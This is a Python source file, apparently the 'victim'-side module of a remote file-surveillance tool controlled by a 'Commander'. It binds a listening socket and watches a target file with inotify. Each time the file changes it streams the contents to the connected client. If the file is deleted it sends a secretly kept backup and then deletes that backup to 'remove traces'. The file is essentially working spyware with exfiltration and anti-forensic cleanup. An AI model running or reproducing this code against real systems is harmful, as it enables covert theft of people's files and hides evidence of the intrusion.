import getopt
import ipaddress
import os
import queue
import socket
import sys
import constants
import importlib
import inotify.adapters


def parse_arguments():
    # Initialization
    print(constants.OPENING_BANNER)
    source_ip, source_port = "", ""

    # GetOpt Arguments
    arguments = sys.argv[1:]
    opts, user_list_args = getopt.getopt(arguments, 's:p:')

    if len(opts) == constants.ZERO:
        sys.exit(constants.NO_ARG_ERROR)

    for opt, argument in opts:
        if opt == '-s':  # For source IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                source_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_SRC_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-p':  # For source port
            try:
                source_port = int(argument)
                if not (constants.MIN_PORT_RANGE < source_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_SRC_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR.format(e))

    # Check if IPs and Ports were specified
    if len(source_ip) == constants.ZERO:
        sys.exit(constants.NO_SRC_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(source_port)) == constants.ZERO:
        sys.exit(constants.NO_SRC_PORT_NUMBER_SPECIFIED_ERROR)

    return source_ip, source_port


def initialize_server_socket(source_ip: str, source_port: int):
    """

    :param source_ip:
    :param source_port:
    :return:
    """
    try:
        # Create a socket object
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Define the server address and port
        server_address = (source_ip, source_port)

        # Bind the socket to the server address and port
        server_socket.bind(server_address)

        # Listen for incoming connections (maximum 5 clients in the queue)
        server_socket.listen(5)
        print(constants.SUCCESS_SOCKET_CREATE_MSG)
        print(constants.SOCKET_INFO_MSG.format(*server_address))

    except PermissionError as e:
        sys.exit(constants.VICTIM_SERVER_SOCKET_CREATION_ERROR_MSG.format(str(e)))

    return server_socket


def is_file_openable(file_path):
    try:
        with open(file_path, constants.READ_MODE) as file:
            pass
        return True
    except IOError as e:
        print(constants.FILE_CANNOT_OPEN_ERROR.format(file_path, e))
        return False


def is_importable(file_name: str):
    print(f"[+] Importing module {file_name}...")

    try:
        importlib.import_module(file_name)
        return True
    except ImportError as e:
        print(constants.FAILED_IMPORT_ERROR.format(file_name, e))
        return False
    except Exception as e:
        print(constants.FAILED_IMPORT_EXCEPTION_ERROR.format(file_name, e))
        return False


def delete_file(file_path: str):
    try:
        if os.path.exists(file_path):
            print(f"[+] OPERATION PENDING: Now deleting {file_path}...")
            os.remove(file_path)
            print(f"[+] OPERATION SUCCESS: {file_path} has been successfully deleted!")
        else:
            print(f"[+] NO ACTION REQUIRED: {file_path} does not exist!")
    except FileNotFoundError:
        print(f"[+] ERROR: The file '{file_path}' does not exist or cannot be deleted.")
    except Exception as e:
        print(f"[+] ERROR: An error occurred while deleting the file: {e}")


def watch_stop_signal(client_socket: socket.socket,
                      signal_queue: queue.Queue):
    while True:
        try:
            signal = client_socket.recv(100).decode()
            if signal == constants.STOP_KEYWORD:
                print(constants.CLIENT_RESPONSE.format(signal))
                signal_queue.put(signal)
                print(constants.WATCH_FILE_SIGNAL_THREAD_END)
                return None
        except socket.timeout as e:
            print("[+] ERROR: Connection to client has timed out : {}".format(e))
            client_socket.settimeout(None)
            return None
        except socket.error as e:
            print("[+] Socket error: {}".format(e))
            client_socket.settimeout(None)
            return None


def __copy_file(source_file_path: str, backup_file_path: str):
    try:
        with open(source_file_path, 'rb') as source:
            with open(backup_file_path, 'wb') as backup:
                while True:
                    chunk = source.read(1024)
                    if not chunk:
                        break
                    backup.write(chunk)
    except Exception as e:
        print(f"[+] COPY FILE TO BACKUP ERROR: An error occurred: {e}")


def create_backup_file(original_filename: str,
                       backup_filename: str,
                       modified_file_dict: dict):
    """
    Creates and replaces the current version of a backup file with a new one
    in the victim's current directory.

    @param original_filename:
            A string representing the original file name

    @param backup_filename:
            A string representing the backup file name

    @param modified_file_dict:
            A dictionary containing files marked with modified status

    @return: None
    """
    # 2) Create an initial backup if it doesn't exist
    if not os.path.exists(backup_filename):
        __copy_file(original_filename, backup_filename)
        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))
        return None

    # 3) Check if the file is modified
    if modified_file_dict[original_filename]:  # If modified (true)...
        # a) Remove old backup
        if os.path.exists(backup_filename):
            os.remove(backup_filename)

        # b) Create a new version of backup
        __copy_file(original_filename, backup_filename)
        print(constants.BACKUP_FILE_CREATED_MSG.format(original_filename, backup_filename))

        # c) Remove modification mark
        modified_file_dict[original_filename] = False
    else:
        return None


def remove_file(file_path: str):
    if os.path.exists(file_path):
        os.remove(file_path)
        print("[+] FILE DELETION SUCCESSFUL: The following file has been deleted {}!".format(file_path))
    else:
        print("[+] ERROR: The following file does not exist: {}".format(file_path))


def watch_file(client_socket: socket.socket,
               file_path: str,
               signal_queue: queue.Queue):

    # Create an inotify object
    notifier = inotify.adapters.Inotify()
    print("[+] WATCHING FILE: Now watching the following file: {}".format(file_path))

    # Add the file to watch for modification and delete events
    wd = notifier.add_watch(file_path)

    # Initialize a modified file dictionary to keep track of modified files
    modified_files_dict = {file_path: False}

    # Create Initial Backup Copy of Watch File
    backup_file_name = constants.BACKUP_MODIFIER + "_" + file_path.split("/")[-1]
    create_backup_file(file_path, backup_file_name, modified_files_dict)

    try:
        while True:
            # Wait for events
            for event in notifier.event_gen():
                # Check signal for stop before processing event
                if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
                    notifier.remove_watch(file_path)
                    return None

                if event is not None:
                    (header, type_names, watch_path, _) = event

                    # a) Create a backup (most present) copy for any event (in case of deletion)
                    backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path
                    create_backup_file(file_path, backup_file_name, modified_files_dict)

                    # c) If Modified -> Send events to Commander for modification
                    if "IN_MODIFY" in type_names:
                        print(constants.WATCH_FILE_MODIFIED.format(watch_path))
                        client_socket.send("IN_MODIFY".encode())

                        # i) Start file transfer
                        with open(file_path, 'rb') as file:
                            while True:
                                file_data = file.read(1024)
                                if not file_data:
                                    break
                                client_socket.send(file_data)

                        client_socket.send(constants.END_OF_FILE_SIGNAL)
                        print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))

                        # ii) Mark file as modified
                        modified_files_dict[file_path] = True

                    # d) If Deleted -> Send events to notify commander that file has been deleted
                    if "IN_DELETE" in type_names or "IN_DELETE_SELF" in type_names:
                        print(constants.WATCH_FILE_DELETED.format(watch_path))
                        client_socket.send("IN_DELETE".encode())

                        # i) Get backup file path
                        backup_file_name = constants.BACKUP_MODIFIER + "_" + watch_path

                        # ii) Start file transfer
                        with open(backup_file_name, 'rb') as file:
                            while True:
                                file_data = file.read(1024)
                                if not file_data:
                                    break
                                client_socket.send(file_data)

                        client_socket.send(constants.END_OF_FILE_SIGNAL)
                        print(constants.WATCH_FILE_TRANSFER_SUCCESS.format(file_path))

                        # iii) Remove traces of backup
                        remove_file(backup_file_name)

                        # iv) Stop watching file and return to main()
                        print("[+] WATCH FILE END: Watch file for {} has ended".format(watch_path))
                        return None

    # Handle Ctrl+C to exit the loop
    except KeyboardInterrupt:
        pass
